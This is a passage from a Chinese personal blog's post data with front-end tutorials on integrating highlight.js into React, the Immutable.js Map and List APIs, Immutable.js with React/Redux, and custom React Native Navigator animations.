上使用 highlight同样的道理，也可以在 Nodejs 上使用。 使用到了两个个 APi： highlight(name, value, [ignore_illegals], [continuation]) name：语言名称，与传递给函数的一样，返回与之一致 highlightAuto relevance：整数值 value：带有突出显示标记的 HTML 字符串 top：当前模式堆栈的顶部 highlightAuto(value, [languageSubset]) value：带有突出显示标记的 HTML 字符串 second_best：具有相同结构的对象具有第二好的启发式检测语言，可能不存在 速度上 highlight 比 highlightAuto 要快，因为它不同自动判断解析语言。 123const hljs = require('highlight.js');const res = hljs.highlight('js', 'let a = 1');// &lt;div class=\"line\"&gt;&lt;span class=\"keyword\"&gt;let&lt;/span&gt; a = &lt;span class=\"number\"&gt;1&lt;/span&gt;;&lt;/div&gt; 在 React 上集成 highlight在 React 里集成 highlight，先要在 componentDidMount 里获取真实的 DOM 节点，然后更多 highlight 的初始化进行配置。 初始化代码： 123456789101112131415161718192021222324252627282930313233import hljs from 'highlight.js/lib/highlight';// 引入语言包import javascript from 'highlight.js/lib/languages/javascript';import php from 'highlight.js/lib/languages/php';import python from 'highlight.js/lib/languages/python';import sql from 'highlight.js/lib/languages/sql';import xml from 'highlight.js/lib/languages/xml';import json from 'highlight.js/lib/languages/json';import css from 'highlight.js/lib/languages/css';import bash from 'highlight.js/lib/languages/bash';import java from 'highlight.js/lib/languages/java';// 解析highlightCode() &#123; const domNode = ReactDOM.findDOMNode(this); const nodes = domNode.querySelectorAll('pre code'); // 注册语言 hljs.registerLanguage('javascript', javascript); hljs.registerLanguage('php', php); hljs.registerLanguage('python', python); hljs.registerLanguage('sql', sql); hljs.registerLanguage('xml', xml); hljs.registerLanguage('json', json); hljs.registerLanguage('css', css); hljs.registerLanguage('bash', bash); hljs.registerLanguage('java', java); for (let i = 0; i &lt; nodes.length; i++) &#123; hljs.highlightBlock(nodes[i]); &#125;&#125; 使用 highlight 时注意不要全部引入语言包，这样会引用很多的 js 文件（700k）。基本只需要引入大众的语言，小众的语言就不要管它了。 更新策略在阅 React 的声明周期，更新时需要在渲染到真实的 DOM 节点后，才能进行更新。 可以在这两个周期函数上进行更新： 1234567componentDidMount() &#123; this.highlightCode();&#125;componentDidUpdate() &#123; this.highlightCode();&#125; 集成为组件集成为组件的所有代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import React, &#123; Component &#125; from 'react';import ReactDOM from 'react-dom';import hljs from 'highlight.js/lib/highlight';import javascript from 'highlight.js/lib/languages/javascript';import php from 'highlight.js/lib/languages/php';import python from 'highlight.js/lib/languages/python';import sql from 'highlight.js/lib/languages/sql';import xml from 'highlight.js/lib/languages/xml';import json from 'highlight.js/lib/languages/json';import css from 'highlight.js/lib/languages/css';import bash from 'highlight.js/lib/languages/bash';import java from 'highlight.js/lib/languages/java';// highlight.js 在 react 上的实现export default class ReactHighlight extends Component &#123; static defaultProps = &#123; innerHTML: false, className: '', languages: [], &#125; componentDidMount() &#123; this.highlightCode(); &#125; componentDidUpdate() &#123; this.highlightCode(); &#125; highlightCode() &#123; const domNode = ReactDOM.findDOMNode(this); const nodes = domNode.querySelectorAll('pre code'); hljs.registerLanguage('javascript', javascript); hljs.registerLanguage('php', php); hljs.registerLanguage('python', python); hljs.registerLanguage('sql', sql); hljs.registerLanguage('xml', xml); hljs.registerLanguage('json', json); hljs.registerLanguage('css', css); hljs.registerLanguage('bash', bash); hljs.registerLanguage('java', java); for (let i = 0; i &lt; nodes.length; i++) &#123; hljs.highlightBlock(nodes[i]); &#125; &#125; // 使用 dangerouslySetInnerHTML 进行插值，防止自动转义 render() &#123; const &#123; children, className, element, innerHTML &#125; = this.props; let Element = element ? React.DOM[element] : null; if (innerHTML) &#123; if (!Element) &#123; Element = React.DOM.div &#125; return Element(&#123; dangerouslySetInnerHTML: &#123; __html: children &#125;, className: className || null &#125;, null); &#125; else &#123; if (Element) &#123; return Element(&#123; className &#125;, children); &#125; else &#123; return &lt;pre&gt;&lt;code className=&#123;className&#125;&gt;&#123;children&#125;&lt;/code&gt;&lt;/pre&gt;; &#125; &#125; &#125;&#125; 使用使用起来非常简单： 1234567import Highlight from './lib/react-highlight';export default (&#123; content &#125;) =&gt; ( &lt;Highlight innerHTML=&#123;true&#125; className='code-content'&gt; &#123;content || ''&#125; &lt;/Highlight&gt;) 总结在 React 上集成其它库，基本都是按部就班了，最关键的是找到真实的节点，在对应的声明周期函数里进行更新。 参考资料 http://highlightjs.readthedocs.io/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"精通 immutable Map 与 List","slug":"React/immutable/精通 immutable Map 与 List","date":"2017-08-28T08:04:21.000Z","updated":"2021-06-15T06:10:52.888Z","comments":true,"path":"/stories/2017/08/React/immutable/精通 immutable Map 与 List/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React/immutable/精通 immutable Map 与 List/","excerpt":"前言immutable 是 Facebook 工程师 Lee Byron 花费 3 年时间打造，与 React 同期出现，但没有被默认放到 React 工具集里（React 提供了简化的 Helper）。它内部实现了一套完整的 Persistent Data Structure，还有很多易用的数据类型。像 Collection、List、Map、Set、Record、Seq。有非常全面的map、filter、groupBy、reduce、find函数式操作方法。同时 API 也尽量与 Object 或 Array 类似。 immutable api 比较多，这里主要是记录 Map, List 等常用数据结构的 api 说明。","text":"前言immutable 是 Facebook 工程师 Lee Byron 花费 3 年时间打造，与 React 同期出现，但没有被默认放到 React 工具集里（React 提供了简化的 Helper）。它内部实现了一套完整的 Persistent Data Structure，还有很多易用的数据类型。像 Collection、List、Map、Set、Record、Seq。有非常全面的map、filter、groupBy、reduce、find函数式操作方法。同时 API 也尽量与 Object 或 Array 类似。 immutable api 比较多，这里主要是记录 Map, List 等常用数据结构的 api 说明。 Map不可变 Map 是无序的 Collection.keyed 的（key, value）键值对，具有 O（log N）读取复杂度和 O（log N）持久化复杂度。Map 的迭代顺序的不确定的，但是是稳定的。多次迭代同一个 Map，迭代顺序将会相同。Map 的键可以为任意类型，使用 Immutable.is 来确定相等性。这将允许使用任意值（包括 NaN）来作为键。 注意：Map 的更新操作都会返回一个新的 immutable 对象，且参数都为 immutable 对象。 常用 api它提供以下常用（部分未列出）的 api： Map(): 构造函数 1Map(&#123; key: \"value\" &#125;) Map.isMap(): 判断是否为 Map 对象 1Map.isMap(Map()) // true size: 成员个数 get(): 根据 key 获取一个值 getIn(): 根据 key array 深度获取一个值 set(): 根据 key 设置一个值，注意 set/update 没有副作用，不会修改原来的对象。 1Map(&#123; name: '小明' &#125;).set('name', '小美') // 小美 setIn(): 根据 key array 深度设置一个值 12// 类似 obj.data.name = '小美'Map(&#123; data: Map(&#123; name: '小明' &#125;) &#125;).setIn(['data', 'name'], '小美') // 小美 delete()/remove(): 删除一个 key deleteIn()/removeIn(): 深度的删除一个 key clear(): 返回一个空的 Map() update(): 更新某个 key 的值，使用回调函数，常用来更新数组 12345const aMap = Map(&#123; nestedList: List([ 1, 2, 3 ]) &#125;)aMap.update('nestedList', list =&gt; list.push(4))// 下面，当 key 不存在是提供，默认值 0aMap.update('oranges', 0, val =&gt; val + 1) updateIn(): 深度的更新一个 key 123const aMap = Map(&#123; data: &#123; title: '喵喵', list: List([1, 2, 3]) &#125; &#125;)// 类似 obj.data.list.push(4);aMap.updateIn(['data', 'list'], list =&gt; list.push(4)) merge(): 合并对象，后面会合并前面的 12345const &#123; Map &#125; = require('immutable')const one = Map(&#123; a: 10, b: 20, c: 30 &#125;)const two = Map(&#123; b: 40, a: 50, d: 60 &#125;)one.merge(two) // Map &#123; \"a\": 50, \"b\": 40, \"c\": 30, \"d\": 60 &#125;two.merge(one) // Map &#123; \"b\": 20, \"a\": 10, \"d\": 60, \"c\": 30 &#125; mergeIn(): 深度的合并对象 hashCode(): 返回 Map 对象的哈希值，可以根据 hash 来对比两个 Map 对象 类型转换相关Map 提供多个类型转换的 api： toJS(): 转换为原生的 js 对象 toJSON(): 转换为 JSON 对象 toArray(): 丢弃 key，把 value 转为原生 js 数组 toObject(): 转换为原生的 js 对象 功能相关Map 提供 map，concat，filter 等 api： has(): 判断 key 值是否在集合里 hasIn(): 深度判断 key 值是否在集合里 includes(): 判断 value 值是否在集合里 first(): 获取集合里的第一个值 last(): 获取集合里的最后一个值 keys(): 类似 Object.keys() values(): 类似 Object.values() reverse(): 返回一个 key 逆序集合 concat(): 合并集合 ListList 是类似于 js 中数组的密集型有序集合。List 是不可变的，修改和读取数据的复杂度为 O（log N），入栈出栈（push, pop）复杂度为 O（1）。List 实现了队列功能，能高效的在队首（unshift, shift）或者队尾（push, pop）进行元素的添加和删除。与 js 的数组不同，在 List 中一个未设置的索引值和设置为 undefined 的索引值是相同的。（不会出现空位的问题） 注意：List 的更新操作都会返回一个新的 immutable 对象，且参数都为 immutable 对象。 常用 api List(): 构造函数 1List([1, 2, 3]); List.isList(): 判断传入参数是否为 List List.of(): 使用传入值新建一个 List 1List.of(1, 2, 3) // =&gt; List [ 1, 2, 3 ] size: 成员个数 get(): 根据 index 获取一个值 getIn(): 根据 index array 深度获取一个值 set(): 根据 index 设置一个值 1List([1, 2]).set(0, 3) // =&gt; List[3, 2] setIn(): 根据 index array 深度设置一个值 12// 类似 arr[1][1] = 4List([ 1, List([2, 3]) ]).setIn([1, 1], 4) // =&gt; List[1, [2, 4]] delete()/remove(): 删除一个 key deleteIn()/removeIn(): 深度的删除一个 key insert(): 在 List 里插入一个 value 1List([1, 2, 3]).insert(1, 4) // =&gt; List[1, 4, 2, 3] clear(): 返回一个空的 List push(): 类似 Array push，但是不会有副作用，因为 List 是不可变的 pop(): 类似 Array.pop unshift(): 类似 Array.unshift shift(): 类似 Array.shift update(): 更新某个 index 的值，使用回调函数，常用来更新数组 123const list = List([ 'a', 'b', 'c' ])const result = list.update(2, val =&gt; val.toUpperCase())// List [ \"a\", \"b\", \"C\" ] updateIn(): 深度的更新一个 key merge(): 合并列表，后面会合并前面的 mergeIn(): 深度的合并对象 hashCode(): 返回 List 对象的哈希值，可以根据 hash 来对比两个 List 对象 类型转换相关List 提供多个类型转换的 api： toJS(): 转换为原生的 js 对象 toJSON(): 转换为 JSON 对象 toArray(): 丢弃 key，把 value 转为原生 js 数组 toObject(): 转换为原生的 js 对象 toStack(): 转为为栈类型 toMap(): 转换为 Map 类型 功能相关List 绝大部分的 api 与原生的 Array api 类似。注意：部分返回数组，在 immutable 里返回的是 list 对象。 has(): 判断 key 值是否在列表里 hasIn(): 深度判断 key 值是否在列表里 includes(): 判断 value 值是否在列表里 first(): 获取列表里的第一个值 last(): 获取列表里的最后一个值 reverse(): 返回一个逆序列表 concat(): 合并列表 slice(): 类似 Array.slice forEach(): 类似 Array.forEach reduce(): 类似 Array.reduce every(): 类似 Array.every some(): 类似 Array.some join(): 类似 Array.join isEmpty(): 判断 List 是否为空，也可以使用 size === 0 来判断 count(): List 元素个数 find(): 类似 Array.find findIndex(): 类似 Array.findIndex splice(): 类似 Array.splice sort(): 类似 Array.sort immutable.is和 Object.is 类似的相等比较方法，但其是比较两个 Collection 是否有相同的值。 is(first: any, second: any): boolean is 用于比较两个不可变数据是否相等，包括 Map 的键值对和 Set 的成员。 如果要对比两个对象完全是否相等，在原生的 js 里需要使用深度对比的方式（浪费 cpu），而 immutable.is 使用 hashCode 来进行对象（快速）。 1234567const &#123; Map, is &#125; = require('immutable');const map1 = Map(&#123; a: 1, b: 1, c: 1 &#125;);const map2 = Map(&#123; a: 1, b: 1, c: 1 &#125;);console.log(map1 === map2); // falseconsole.log(Object.is(map1, map2)) // falseconsole.log(is(map1, map2)) // true is() 不仅仅能比较原始的字符串、数值和不可变集合比如 Map 和 Set，也能比较实现了包含 equals() 和 hashCode() 两个方法的 ValueObject。 注意，下面的差别，当 Map 在构造时必须全部都有构造为 Immutable 结构，is 才能发挥作用。 12345678910const &#123; Map, is &#125; = require('immutable');const map1 = Map(&#123; a: 1, b: 1, c: 1, d: Map(&#123; e: 1 &#125;) &#125;);const map2 = Map(&#123; a: 1, b: 1, c: 1, d: Map(&#123; e: 1 &#125;) &#125;);console.log(map1.hashCode()) // 1047758636console.log(map2.hashCode()) // 1047758636console.log(map1 === map2); // falseconsole.log(Object.is(map1, map2)) // falseconsole.log(is(map1, map2)) // true map1，map2 是一个混合结构，map1 是不可变对象，而 map1.get(‘d’) 是一个可变对象（原生 js 对象）。这种创建方式非常危险，有时根本会分不清对象是可变还是不可变。 12345678910const &#123; Map, is &#125; = require('immutable');const map1 = Map(&#123; a: 1, b: 1, c: 1, d: &#123; e: 1 &#125; &#125;);const map2 = Map(&#123; a: 1, b: 1, c: 1, d: &#123; e: 1 &#125; &#125;);console.log(map1.hashCode()) // -114276036console.log(map2.hashCode()) // -647581371console.log(map1 === map2); // falseconsole.log(Object.is(map1, map2)) // falseconsole.log(is(map1, map2)) // false 如果你的数据复杂，嵌套层次多，或者是从数据库/服务器拿到的 json 数据，为了方便可以使用 fromJS() 来转换，速度比 Map, List 等构造函数慢。 12345678910const &#123; Map, is, fromJS &#125; = require('immutable');const map1 = fromJS(&#123; a: 1, b: 1, c: 1, d: &#123; e: 1 &#125; &#125;);const map2 = fromJS(&#123; a: 1, b: 1, c: 1, d: &#123; e: 1 &#125; &#125;);console.log(map1.hashCode()) // 1047758636console.log(map2.hashCode()) // 1047758636console.log(map1 === map2); // falseconsole.log(Object.is(map1, map2)) // falseconsole.log(is(map1, map2)) // true 参考资料 http://facebook.github.io/immutable-js/docs/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"使用 immutable 进一步优化 React 性能","slug":"React/immutable/使用 immutable 进一步优化 React 性能","date":"2017-08-27T02:20:12.000Z","updated":"2021-06-15T06:10:52.888Z","comments":true,"path":"/stories/2017/08/React/immutable/使用 immutable 进一步优化 React 性能/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React/immutable/使用 immutable 进一步优化 React 性能/","excerpt":"前言 Shared mutable state is the root of all evil（共享的可变状态是万恶之源） – Pete Hunt 有人说 immutable 可以给React应用带来数十倍的提升，也有人说 Immutable 的引入是近期JavaScript中伟大的发明，因为同期 React 太火，它的光芒被掩盖了。这些至少说明 Immutable 是很有价值的，下面我们来一探究竟。 JavaScript 中的对象一般是可变的（Mutable），因为使用了引用赋值，新的对象简单的引用了原始对象，改变新的对象将影响到原始对象。 12345let foo = &#123; a: 1 &#125;;let bar = foo;bar.a = 2;console.log(bar.a); // 2console.log(foo.a); // 2 虽然这样做可以节约内存，但当应用复杂后，这就造成了非常大的隐患，Mutable 带来的优点变得得不偿失。为了解决这个问题，一般的做法是使用 shallowCopy（浅拷贝）或 deepCopy（深拷贝）来避免被修改，但这样做造成了 CPU 和内存的浪费。 Immutable 可以很好地解决这些问题。","text":"前言 Shared mutable state is the root of all evil（共享的可变状态是万恶之源） – Pete Hunt 有人说 immutable 可以给React应用带来数十倍的提升，也有人说 Immutable 的引入是近期JavaScript中伟大的发明，因为同期 React 太火，它的光芒被掩盖了。这些至少说明 Immutable 是很有价值的，下面我们来一探究竟。 JavaScript 中的对象一般是可变的（Mutable），因为使用了引用赋值，新的对象简单的引用了原始对象，改变新的对象将影响到原始对象。 12345let foo = &#123; a: 1 &#125;;let bar = foo;bar.a = 2;console.log(bar.a); // 2console.log(foo.a); // 2 虽然这样做可以节约内存，但当应用复杂后，这就造成了非常大的隐患，Mutable 带来的优点变得得不偿失。为了解决这个问题，一般的做法是使用 shallowCopy（浅拷贝）或 deepCopy（深拷贝）来避免被修改，但这样做造成了 CPU 和内存的浪费。 Immutable 可以很好地解决这些问题。 ImmutableImmutable Data 就是一旦创建，就不能再被更改的数据。对 Immutable 对象的任何修改或添加删除操作都会返回一个新的 Immutable 对象。Immutable 实现的原理是 Persistent Data Structure（持久化数据结构），也就是使用旧数据创建新数据时，要保证旧数据同时可用且不变。同时为了避免 deepCopy 把所有节点都复制一遍带来的性能损耗，Immutable 使用了 Structural Sharing（结构共享），即如果对象树中一个节点发生变化，只修改这个节点和受它影响的父节点，其它节点则进行共享。 它内部实现了一套完整的 Persistent Data Structure，还有很多易用的数据类型。像 Collection、List、Map、Set、Record、Seq。有非常全面的 map、filter、groupBy、reduce、find 函数式操作方法。同时 API 也尽量与 Object 或 Array 类似。 其中有 3 种最重要的数据结构说明一下： Map：键值对集合，对应于 Object，ES6 也有专门的 Map 对象 List：有序可重复的列表，对应于 Array Set：无序且不可重复的列表 1234567891011121314151617181920// 原来的写法let foo = &#123;a: &#123;b: 1&#125;&#125;;let bar = foo;bar.a.b = 2;console.log(foo.a.b); // 打印 2console.log(foo === bar); // 打印 true// 使用 immutable.js 后import Immutable from 'immutable';foo = Immutable.fromJS(&#123;a: &#123;b: 1&#125;&#125;);bar = foo.setIn(['a', 'b'], 2); // 使用 setIn 赋值console.log(foo.getIn(['a', 'b'])); // 使用 getIn 取值，打印 1console.log(foo === bar); // 打印 false// 使用 seamless-immutable.js 后import SImmutable from 'seamless-immutable';foo = SImmutable(&#123;a: &#123;b: 1&#125;&#125;)bar = foo.merge(&#123;a: &#123; b: 2&#125;&#125;) // 使用 merge 赋值console.log(foo.a.b); // 像原生 Object 一样取值，打印 1console.log(foo === bar); // 打印 false 常用的 apiImmutable.js主要提供了下面几种数据类型： List：类似 Array Map：类似 Object OrderedMap：在 Map 的基础上根据 Set 顺序进行排序 Set： 类似 ES6 中的 Set OrderedSet：在 Set 的基础上根据 add 顺序进行排序 Stack：有序集合，进行 unshift 和 shift 的操作复杂度为 O(1) Range(start, end, step)：返回 Seq.Indexed 类型数据的集合 Repeat(value, times)：返回 Seq.Indexed 类型的数据集合，重复 times 生成 value 值 Record：；类似 ES6 中的 Class，细节上不同 Seq：序列 Iterable：可以被迭代的 key，value 集合，是其他所有集合的基类 Collection：抽象类，无法直接构建此类型 其中最常用的是 List，Map，对应的是原生对象都 Array 与 Object。 fromJS(): 将原生 js 数据转换为 Immutable 数据的转换方法 1const data = Immutable.from(&#123;a: &#123;b: [10, 11]&#125;&#125;); toJS(): 将 Immutable 数据转换为原生 js set() 123456const originalList = List([ 0 ]);// List [ 0 ]originalList.set(1, 1);// List [ 0, 1 ]List().set(50000, 'value').size;// 50001 setIn(): 进行深度赋值 123const list = List([ 0, 1, 2, List([ 3, 4 ])])list.setIn([3, 0], 999);// List [ 0, 1, 2, List [ 999, 4 ] ] get() 12const list = List([ 0 ]);let value = list.get(0); // 0 getIn(): 进行深度取值 12const list = List([ 0, 1, 2, List([ 3, 4 ])]);let value = list.getIn([3, 0]); // 3 is(): 进行值对比[对于复杂对象其实是 hashCode 的对比]，速度是 O (n) 12345const map1 = Map(&#123; a: 1, b: 1, c: 1 &#125;)const map2 = Map(&#123; a: 1, b: 1, c: 1 &#125;)assert(map1 !== map2)assert(Object.is(map1, map2) === false)assert(is(map1, map2) === true) 集成到 React + Redux 项目中要把immutable.js继承集成到 React + Redux 中，需要做几样事情： combineReducers 的切换 每个 Reducer 的初始化数据也应该采用 Immutable 数据 与服务端数据的交互在第获取一时间转换为 Immutable 数据，在发送第一时间转化为原生数据 组件的数据也应该采用 immutable 数据 处理 shouldComponentUpdate 为了不与原生对象混淆，比较建议的是全局使用 immutable 对象。 combineReducers对于 combineReducers，需要引入 redux-immutable，它提供的 combineReducers 可以处理 Immutable 数据。 使用了 immutable 之后： 123456789101112131415161718import &#123; createStore, compose, applyMiddleware, // combineReducers&#125; from 'redux';import thunk from 'redux-thunk';import &#123; combineReducers &#125; from 'redux-immutable';import * as reducers from './reducers';export default store = createStore( combineReducers(&#123; ...reducers &#125;), compose( applyMiddleware(thunk), )); 每个 reducers对于每个 reducers 应该都使用 immutable 数据。 例如，初始化数据： 123456const init_state = immutable.Map(&#123; key: '', limit: 20, page: 0, list: immutable.List([]),&#125;); 在 reducers 里要返回 immutable： 1234567891011// 不使用 immutablecase SEARCH.loadmore: return &#123; ...state, list: [...state.list, ...action.list], page: action.page,&#125;// 使用 immutablecase SEARCH.loadmore: return state .update('list', v =&gt; v.push(action.list)) .set('page', action.page); fetch 之后为了带来不必要的混淆，在 fetch 之间需要把 immutable 对象转为原生对象，在 fetch 之后将原生转为 immutable。 因此要记住，fetch 的入口是原生对象，而出口是 immutable 对象。 123fetch(url) .then(res =&gt; res.json()) .then(json =&gt; immutable.fromJS(json)); 组件的数据对与组件的数据也应该采用 immutable 对象。 12345678910// 原生对象&lt;View&gt; &lt;Text style=&#123;$.name&#125;&gt;&#123;data.name&#125;&lt;/Text&gt; &lt;Text&gt;&#123;data.description&#125;&lt;/Text&gt;&lt;/View&gt;// immutable&lt;View&gt; &lt;Text style=&#123;$.name&#125;&gt;&#123;data.get('name')&#125;&lt;/Text&gt; &lt;Text&gt;&#123;data.get('description')&#125;&lt;/Text&gt;&lt;/View&gt; 处理 shouldComponentUpdate性能优化的关键是 shouldComponentUpdate，shouldComponentUpdate 具体怎么封装有很多种办法，我们这里选择了封装一层 component 的基类，在基类中去统一处理 shouldComponentUpdate，组件中直接继承基类的方式。 123456789101112131415161718192021222324252627282930313233343536// baseComponent.js component的基类方法import React from 'react';import &#123; is &#125; from 'immutable';export default class BaseComponent extends React.Component &#123; constructor(props, context, updater) &#123; super(props, context, updater); &#125; // this.props.x 是 immutable 对象 shouldComponentUpdate(nextProps, nextState) &#123; const thisProps = this.props || &#123;&#125;; const thisState = this.state || &#123;&#125;; nextState = nextState || &#123;&#125;; nextProps = nextProps || &#123;&#125;; if (Object.keys(thisProps).length !== Object.keys(nextProps).length || Object.keys(thisState).length !== Object.keys(nextState).length) &#123; return true; &#125; for (const key in nextProps) &#123; if (!is(thisProps[key], nextProps[key])) &#123; return true; &#125; &#125; for (const key in nextState) &#123; if (!is(thisState[key], nextState[key])) &#123; return true; &#125; &#125; return false; &#125;&#125; 组件中如果需要使用统一封装的 shouldComponentUpdate，则直接继承基类： 1234import BaseComponent from './BaseComponent';class Menu extends BaseComponent &#123; // ...&#125; 最简单的集成在现有的项目里集成往往比较困难，需要改动的东西比较多。可以使用部分 immutable 的方式，在 shouldComponentUpdate 做转换判断。 1234567891011121314151617181920// baseComponent.js component的基类方法import React from 'react';import &#123; is, fromJS &#125; from 'immutable';export default class BaseComponent extends React.Component &#123; constructor(props, context, updater) &#123; super(props, context, updater); &#125; // 在 shouldComponentUpdate 里做转换，利用 hashCode 比较 shouldComponentUpdate(nextProps, nextState) &#123; const ithisPropsHash = fromJS(this.props).hashCode(); const inextPropsHash = fromJS(nextProps).hashCode(); const ithisStateHash = fromJS(this.state).hashCode(); const inextStateHash = fromJS(nextState).hashCode(); return !(ithisPropsHash === inextPropsHash) || !(ithisStateHash === inextStateHash); &#125;&#125; fromJS 转换出的，使用is()有 Bug：https://github.com/facebook/immutable-js/issues/1297 immutable 优缺点immutable 不是万金油，只有在特定的环境下才会体现出它的价值，对于小型的项目还是不要使用 immutable 好，如果你的项目很庞大，而且需要很高的性能要求，那么推荐使用 immutable。 优点： 能便利的进行时间溯洄，便于状态的把控与调试 结构共享，节约内存 并发安全 能抽象出统一的对比函数 Model 与 View 耦合度不高 缺点： 有学习成本。 容易与原生函数混淆，并且原生函数一旦重写可能会导致问题。 资源大小增加 （5000 行代码）。 跨页面数据同步方式会有变动，之前页面间进行引用传递，在 B 页面进行的修改会自动呈现到 A 页面，但是现在是持久性数据结构（Persistent data structire），因此 B 页面的改动 A 页面无感，需要特殊的触发机制来进行状态同步。 因为并非原生的数据结构，所以像解构这种用法需要引入特殊的库后才能使用。 参考资料 http://stylechen.com/react-and-immutable.html http://xgfe.github.io/2017/07/10/lulutia/immutable-RN-Redux/ http://facebook.github.io/immutable-js/ https://zhuanlan.zhihu.com/p/20295971?columnSlug=purerender","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React Native Navigator 自定义动画","slug":"React Native/Router/React Native Navigator 自定义动画","date":"2017-08-25T03:35:03.000Z","updated":"2021-06-15T06:10:52.866Z","comments":true,"path":"/stories/2017/08/React Native/Router/React Native Navigator 自定义动画/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React Native/Router/React Native Navigator 自定义动画/","excerpt":"前言React Native 的 Navigator 模块在 v0.44 被移出主项目里，分到其他由第三方管理。比如：react-native-deprecated-custom-components。 虽然官方不推荐使用Navigator模块，而是推荐使用 react-navigation，但是react-navigation有个问题是导航动画不够丰富。因此目前还是没有其他很好的解决方案，所以还是要使用 Navigator模块。 对于 Navigator 来说，它提供了几种的默认导航动画效果，这些动画效果各有不同，有的表现缓慢有的表现快速。","text":"前言React Native 的 Navigator 模块在 v0.44 被移出主项目里，分到其他由第三方管理。比如：react-native-deprecated-custom-components。 虽然官方不推荐使用Navigator模块，而是推荐使用 react-navigation，但是react-navigation有个问题是导航动画不够丰富。因此目前还是没有其他很好的解决方案，所以还是要使用 Navigator模块。 对于 Navigator 来说，它提供了几种的默认导航动画效果，这些动画效果各有不同，有的表现缓慢有的表现快速。 Navigator 过渡动画Navigator应该是 RN 的一个核心 component， 相当于 web SPA 的路由。一般的 APP 在视图 “页面” 进出栈的时候都会有一个过渡动画，RN 当然也在 Navigator 中有相关的配置。如下： 1234567&lt;Navigator initialRouteStack=&#123;Route&#125; renderScene=&#123;this._renderRoute.bind(this)&#125; configureScene=&#123;(route, routeStack) =&gt; Navigator.SceneConfigs.PushFromRight &#125; /&gt; 其中 configureScene 的配置项就用于配置“页面”进出的过渡动画。 官方默认的配置有这几种： 12345678910Navigator.SceneConfigs.PushFromRight (default)Navigator.SceneConfigs.FloatFromRightNavigator.SceneConfigs.FloatFromLeftNavigator.SceneConfigs.FloatFromBottomNavigator.SceneConfigs.FloatFromBottomAndroidNavigator.SceneConfigs.FadeAndroidNavigator.SceneConfigs.HorizontalSwipeJumpNavigator.SceneConfigs.HorizontalSwipeJumpFromRightNavigator.SceneConfigs.VerticalUpSwipeJumpNavigator.SceneConfigs.VerticalDownSwipeJump 自定义动画速度但使用PushFromRight这种效果时会发现在切换的速度上有点缓慢，如果你想要类似微信/QQ，那种带有紧张感的导航切换速度，可能需要做一些调整。 在官方文档上是没一介绍这部分的，所有我们需要自己去查看源码，来做修改。 那么与速率相关的代码在哪里？在源码的 NavigatorSceneConfigs.js 文件里可以找到。 我使用的是 react-native-deprecated-custom-components 这个包，可以在 node_modules/react-native-deprecated-custom-components/src/NavigatorSceneConfigs.js 里找到。在 react-native v0.44 之前的版本，可以在 react-native 包里查找。 涉及的属性： springFriction 弹簧类动画的摩擦系数 springTension 弹簧类动画的弹性系数，用于微调动画结尾时的“弹性抖动”效果 defaultTransitionVelocity 默认动画的加速度 1234567891011121314151617181920// NavigatorSceneConfigs.js =&gt; 572 行处var BaseConfig = &#123; // A list of all gestures that are enabled on this scene gestures: &#123; pop: directionMapping.BaseStartToEndGesture, &#125;, // Rebound spring parameters when transitioning FROM this scene springFriction: 26, springTension: 200, // Velocity to start at when transitioning without gesture defaultTransitionVelocity: 1.5, // Animation interpolators for horizontal transitioning: animationInterpolators: &#123; into: buildStyleInterpolator(directionMapping.FromTheEnd), out: buildStyleInterpolator(directionMapping.FadeToTheStart), &#125;,&#125;; 因为 object 在 js 里是引用关系，而且没有 private 的概念，所以我们可以在外部直接修改。 123456configureScene = (route, navigator) =&gt; &#123; Navigator.SceneConfigs.PushFromRight.defaultTransitionVelocity = 12; Navigator.SceneConfigs.PushFromRight.springFriction = 25; Navigator.SceneConfigs.PushFromRight.springTension = 190; return Navigator.SceneConfigs.PushFromRight;&#125; 经过不断的微调，达到了类似微信导航切换的效果。 自定义动画上面的动画还是挺丰富的，不过肯定没法满足大众的种类需求啊 T_T，所以需要我们自己定义了。 在 NavigatorSceneConfigs.js 里 看源码，可以知道关键的动画定义主要在这几个部分，我们把它抽离，做几个修改就变成了一个自定义的动画。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137import React, &#123; Dimensions, PixelRatio&#125; from 'react-native';import buildStyleInterpolator from 'buildStyleInterpolator';const SCREEN_WIDTH = Dimensions.get('window').width, SCREEN_HEIGHT = Dimensions.get('window').height;// 去左边const OutToLeft = &#123; transformTranslate: &#123; // 转化，插值 from: &#123;x: 0, y: 0, z: 0&#125;, to: &#123;x: -SCREEN_WIDTH, y: 0, z: 0&#125;, min: 0, max: 1, type: 'linear', extrapolate: true, round: PixelRatio.get() &#125;, translateX: &#123; from: 0, to: -SCREEN_WIDTH, min: 0, max: 1, type: 'linear', extrapolate: true, round: PixelRatio.get() &#125;, opacity: &#123; from: 1, to: 0, min: 0, max: 0.5, type: 'linear', extrapolate: false, round: 100 &#125;, scale: &#123; value: 1, type: 'constant' &#125;&#125;;// 到达右边const InFromRight = &#123; transformTranslate: &#123; from: &#123;x: SCREEN_WIDTH, y: 0, z: 0&#125;, to: &#123;x: 0, y: 0, z: 0&#125;, min: 0, max: 1, type: 'linear', extrapolate: true, round: PixelRatio.get() &#125;, 